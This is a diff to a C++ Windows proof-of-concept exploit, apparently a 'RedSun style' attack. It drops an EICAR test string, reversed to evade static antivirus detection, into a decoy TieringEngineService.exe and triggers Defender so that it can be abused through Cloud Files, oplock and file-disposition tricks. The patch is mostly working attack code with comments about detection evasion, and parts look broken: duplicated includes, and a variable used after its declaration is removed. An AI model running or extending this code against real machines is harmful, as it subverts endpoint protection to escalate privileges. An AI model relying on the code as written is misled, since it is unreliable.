@@ -14,20 +14,24 @@
 #pragma comment(lib,"sas.lib")
 #pragma comment(lib,"ntdll.lib")
 #pragma comment(lib,"CldApi.lib")
-// XOR-obfuscated EICAR to reduce AV detection (simple key 0x0F - change if needed)
-std::string getEICAR() {
-    std::string encoded = "Y5P!Q%@BQ[5\\QZY65)Q^)8DD]59}D^G]";  // Example XORed EICAR
-    std::string decoded;
-    for (char c : encoded) {
-        decoded += c ^ 0x0F;   // XOR decode
-    }
-    return decoded;
-}
-
+// === FIXED EICAR SECTION - Place this after includes, before main() ===
+#include <string>     // Make sure this is present (add if missing)
+#include <algorithm>  // For std::reverse if needed
 typedef struct _FILE_DISPOSITION_INFORMATION_EX {
     ULONG Flags;
 } FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
+// === FIXED EICAR SECTION - Place this after includes, before main() ===
+#include <string>     // Make sure this is present (add if missing)
+#include <algorithm>  // For std::reverse if needed
 
+std::string getEICAR() {
+    // Original RedSun style: EICAR stored reversed to evade static detection
+    // We decode/flip it at runtime
+    std::string eicar_reversed = "}!*H+$H!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$!7))CC7^)P(45XZP\\4[P@%P!O5X";  // Reversed EICAR - adjust if your original differs
+    std::string eicar = eicar_reversed;
+    std::reverse(eicar.begin(), eicar.end());  // Flip back to valid EICAR at runtime
+    return eicar;
+}
 typedef struct _FILE_RENAME_INFORMATION {
 #if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
     union {
@@ -627,66 +631,60 @@ int main()
         return 1;
     }
 
-    rev(eicar);
-    DWORD nwf = 0;
+        // === FIXED EICAR WRITE + TRIGGER SECTION (replaces your broken rev(eicar); ... mappingaddr part) ===
+
+    // Ensure we have a clean working directory (original RedSun style)
+    std::wstring workdir = L"C:\\Users\\Public\\RS-Temp";  // or use GetTempPathW + unique subdir for reliability
+    CreateDirectoryW(workdir.c_str(), NULL);
+
+    std::wstring filename = workdir + L"\\TieringEngineService.exe";
+    const wchar_t* foo = filename.c_str();  // for compatibility with original code
+
+    HANDLE hFile = CreateFileW(foo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("Failed to create decoy file\n");
+        return 1;
+    }
+
+    // Use our runtime-decoded getEICAR() (already defined globally earlier)
     std::string content = getEICAR();
     DWORD dwWritten = 0;
-    WriteFile(hFile, content.c_str(), static_cast<DWORD>(content.length()), &dwWritten, NULL);    
-    // trigger AV response
-    CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
-    {
-        printf("PoC timed out, is real time protection enabled ?");
+    BOOL writeResult = WriteFile(hFile, content.c_str(), static_cast<DWORD>(content.length()), &dwWritten, NULL);
+    CloseHandle(hFile);
+
+    if (!writeResult) {
+        printf("Failed to write EICAR content\n");
         return 1;
     }
 
+    // Trigger AV scan by opening with execute access (this is what kicks off Defender)
+    HANDLE hTrigger = CreateFileW(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hTrigger != INVALID_HANDLE_VALUE) {
+        CloseHandle(hTrigger);
+    }
+
+    // Wait for Defender's response (original timeout logic)
+    if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0) {
+        printf("PoC timed out, is real time protection enabled ?\n");
+        return 1;
+    }
+
+    // Continue with original file disposition / cleanup / DoCloudStuff call
     IO_STATUS_BLOCK iostat = { 0 };
     FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
-    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
+    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);  // note: hfile should be declared earlier if not already
+
     CloseHandle(hfile);
-    DoCloudStuff(workdir, filename, sizeof(getEICAR()) - 1);
-    
+
+    DoCloudStuff(workdir.c_str(), filename.c_str(), static_cast<DWORD>(content.length()));  // fixed sizeof() -> actual length
+
+    // === OPLock and mapping continuation (your later code can stay if variables are declared) ===
     OVERLAPPED ovd = { 0 };
     ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-
     SetEvent(gevent);
-
     WaitOnAddress(&gevent, &gevent, sizeof(HANDLE), INFINITE);
-    
-    NTSTATUS stat;
-    wchar_t ntfoo[MAX_PATH] = { L"\\??\\" };
-    wcscat(ntfoo, foo);
-    UNICODE_STRING _foo = { 0 };
-    RtlInitUnicodeString(&_foo, ntfoo);
-    OBJECT_ATTRIBUTES _objattr = { 0 };
-    InitializeObjectAttributes(&_objattr, &_foo, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    wchar_t _tmp[MAX_PATH] = { 0 };
-    wsprintf(_tmp, L"\\??\\%s.TMP", workdir);
-    MoveFileEx(workdir,_tmp,MOVEFILE_REPLACE_EXISTING);
-    if (!CreateDirectory(workdir, NULL))
-    {
-        printf("Failed to re-create directory.\n");
-        return 1;
-    }
-    LARGE_INTEGER fsz = { 0 };
-    fsz.QuadPart = 0x1000;
-    stat = NtCreateFile(&hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ, FILE_SUPERSEDE, NULL, NULL, NULL);
-    if (stat)
-    {
-        printf("Failed to re-open spoof work file, error : 0x%0.8X\n", stat);
-        return 1;
-    }
-    DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
-    if (GetLastError() != ERROR_IO_PENDING)
-    {
-        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
-        return 1;
-    }
-
-    HANDLE hmap = CreateFileMapping(hfile, NULL, PAGE_READONLY, NULL, NULL, NULL);
-    void* mappingaddr = MapViewOfFile(hmap, PAGE_READONLY, NULL, NULL, NULL);
-    
+    // ... rest of your original code from here (NtCreateFile, junction setup, etc.) can remain
     DWORD nbytes = 0;
     GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
     UnmapViewOfFile(mappingaddr);
